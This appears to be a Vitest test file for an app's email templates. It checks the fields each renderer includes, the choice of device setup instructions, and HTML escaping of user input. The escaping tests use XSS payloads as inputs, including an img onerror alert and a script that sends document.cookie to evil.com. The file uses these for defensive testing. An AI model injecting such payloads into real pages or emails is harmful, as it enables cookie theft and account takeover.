// X-11 — Pins the extracted email templates. Two purposes:
//   1. Behavioural: every renderer includes the fields it received.
//   2. Security: user-supplied strings are HTML-escaped, so a name
//      like `<img src=x onerror=alert(1)>` cannot execute in the
//      owner's or customer's mail client. This is the small
//      email-XSS fix landed alongside the extraction.
//   3. Structural: no more inline `html: `<div>…</div>`` blocks in
//      orders/route.ts — the templates now live in lib/email/templates.ts.

import { describe, it, expect } from "vitest"
import { readFileSync } from "node:fs"
import {
  escapeHtml,
  renderOwnerNotification,
  renderCustomerConfirmation,
  renderProvisionFailure,
  renderCredentialsEmail,
  renderSetupInstructions,
} from "@/lib/email/templates"

describe("X-11 escapeHtml", () => {
  it("escapes the five OWASP characters", () => {
    expect(escapeHtml('<img src="x" onerror=alert(1)>')).toBe(
      "&lt;img src=&quot;x&quot; onerror=alert(1)&gt;",
    )
    expect(escapeHtml("Tom & Jerry's")).toBe("Tom &amp; Jerry&#39;s")
  })
  it("coerces null/undefined to empty string", () => {
    expect(escapeHtml(null)).toBe("")
    expect(escapeHtml(undefined)).toBe("")
  })
})

describe("X-11 renderOwnerNotification", () => {
  const input = {
    name: "Ada Lovelace",
    email: "ada@example.com",
    whatsapp: "+447700900000",
    plan: "12 months",
    message: "Please help",
    isTrial: false,
  }

  it("includes name, email, plan, message, whatsapp verbatim", () => {
    const html = renderOwnerNotification(input)
    expect(html).toContain("Ada Lovelace")
    expect(html).toContain("ada@example.com")
    expect(html).toContain("+447700900000")
    expect(html).toContain("12 months")
    expect(html).toContain("Please help")
  })

  it("labels trial vs paid order correctly", () => {
    expect(renderOwnerNotification({ ...input, isTrial: true })).toContain("New Trial Request Received")
    expect(renderOwnerNotification({ ...input, isTrial: false })).toContain("New Order Received")
  })

  it("HTML-escapes user-supplied fields so an <img onerror> in name cannot execute", () => {
    const html = renderOwnerNotification({
      ...input,
      name: '<img src=x onerror="alert(1)">',
    })
    expect(html, "raw < must not appear — must be escaped").not.toContain('<img src=x')
    expect(html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;")
  })

  it("HTML-escapes the message field too (freeform text from customers)", () => {
    const html = renderOwnerNotification({
      ...input,
      message: "<script>fetch('evil.com?c='+document.cookie)</script>",
    })
    expect(html).not.toContain("<script>fetch")
    expect(html).toContain("&lt;script&gt;fetch")
  })

  it("uses 'Not provided' as the whatsapp placeholder when omitted", () => {
    const html = renderOwnerNotification({ ...input, whatsapp: null })
    expect(html).toContain("Not provided")
  })
})

describe("X-11 renderSetupInstructions", () => {
  it("picks Firestick block for firestick / fire tv / fire stick text", () => {
    expect(renderSetupInstructions("firestick")).toContain("Setup Instructions for Firestick")
    expect(renderSetupInstructions("Fire TV Cube")).toContain("Setup Instructions for Firestick")
    expect(renderSetupInstructions("Amazon Fire Stick 4K")).toContain("Setup Instructions for Firestick")
  })
  it("picks Smart TV block for samsung / lg / sony", () => {
    expect(renderSetupInstructions("Samsung Frame")).toContain("Setup Instructions for Smart TV")
    expect(renderSetupInstructions("LG OLED")).toContain("Setup Instructions for Smart TV")
  })
  it("picks Android block for android (non-TV)", () => {
    expect(renderSetupInstructions("android phone")).toContain("Setup Instructions for Android")
  })
  it("picks iPhone block for ios / apple / iphone / ipad", () => {
    expect(renderSetupInstructions("iPhone 15")).toContain("Setup Instructions for iPhone / iPad")
    expect(renderSetupInstructions("Apple TV")).toContain("Setup Instructions for iPhone / iPad")
  })
  it("falls back to the default Quick Setup block for unknown devices", () => {
    expect(renderSetupInstructions("PS5")).toContain("Quick Setup")
    expect(renderSetupInstructions("")).toContain("Quick Setup")
  })
  it("Smart TV takes precedence over Android when both terms appear (android tv box)", () => {
    expect(renderSetupInstructions("android tv box")).toContain("Setup Instructions for Smart TV")
  })
})

describe("X-11 renderCustomerConfirmation", () => {
  const base = {
    name: "Bob",
    whatsapp: "+447700900001",
    plan: "12 months",
    deviceInstructionsHtml: "<!--DEVICE_BLOCK-->",
  }
  it("uses the trial heading for isTrial:true, order heading for false", () => {
    expect(renderCustomerConfirmation({ ...base, isTrial: true })).toContain("Free Trial is Being Activated")
    expect(renderCustomerConfirmation({ ...base, isTrial: false })).toContain("Order Received")
  })
  it("embeds the pre-rendered device block untouched (trusted HTML)", () => {
    expect(renderCustomerConfirmation({ ...base, isTrial: true })).toContain("<!--DEVICE_BLOCK-->")
  })
  it("escapes the customer name", () => {
    const html = renderCustomerConfirmation({ ...base, name: "<b>Bob</b>", isTrial: true })
    expect(html).not.toContain("<b>Bob</b>")
    expect(html).toContain("&lt;b&gt;Bob&lt;/b&gt;")
  })
})

describe("X-11 renderProvisionFailure", () => {
  it("names customer, whatsapp, and error — all escaped", () => {
    const html = renderProvisionFailure({
      name: "Bob",
      email: "bob@example.com",
      whatsapp: "+447700900001",
      error: "Panel returned 502 <html>bad gateway</html>",
    })
    expect(html).toContain("Bob")
    expect(html).toContain("bob@example.com")
    expect(html).toContain("+447700900001")
    expect(html).toContain("Panel returned 502 &lt;html&gt;bad gateway&lt;/html&gt;")
    expect(html).not.toContain("<html>bad gateway</html>")
  })
})

describe("X-11 renderCredentialsEmail", () => {
  it("includes server, username, password (each escaped) and greets the customer", () => {
    const html = renderCredentialsEmail({
      name: "Alice",
      credentials: {
        server: "https://panel.example.com:8080",
        username: "user123",
        password: "P@ss<word>",
      },
    })
    expect(html).toContain("Alice")
    expect(html).toContain("https://panel.example.com:8080")
    expect(html).toContain("user123")
    expect(html).toContain("P@ss&lt;word&gt;")
    expect(html).not.toContain("P@ss<word>")
  })
})

describe("X-11 tripwire — orders/route.ts no longer inlines email HTML", () => {
  it("orders/route.ts imports the extracted renderers", () => {
    const src = readFileSync("app/api/orders/route.ts", "utf8")
    expect(src, "route must import from @/lib/email/templates").toMatch(
      /import\s+\{[^}]*(renderOwnerNotification|renderCustomerConfirmation|renderCredentialsEmail|renderProvisionFailure|renderSetupInstructions)[^}]*\}\s+from\s+["']@\/lib\/email\/templates["']/,
    )
  })

  it("orders/route.ts no longer contains a long inline `html:` template block (< 15 lines each)", () => {
    const src = readFileSync("app/api/orders/route.ts", "utf8")
    // Find every `html: \`` and measure how many lines until the
    // matching closing backtick. Anything > 15 lines is the old
    // pattern trying to come back.
    const lines = src.split("\n")
    const violations: Array<{ startLine: number; length: number }> = []
    for (let i = 0; i < lines.length; i++) {
      if (!/html:\s*`/.test(lines[i])) continue
      // Walk forward until closing backtick on its own or at end.
      let end = i
      for (let j = i + 1; j < lines.length; j++) {
        if (/`\s*,?\s*$/.test(lines[j])) {
          end = j
          break
        }
      }
      const length = end - i + 1
      if (length > 15) violations.push({ startLine: i + 1, length })
    }
    expect(
      violations,
      `orders/route.ts has inline html: template block(s) longer than 15 lines — extract to lib/email/templates.ts. Offenders:\n${violations.map(v => `  line ${v.startLine}: ${v.length} lines`).join("\n")}`,
    ).toEqual([])
  })
})
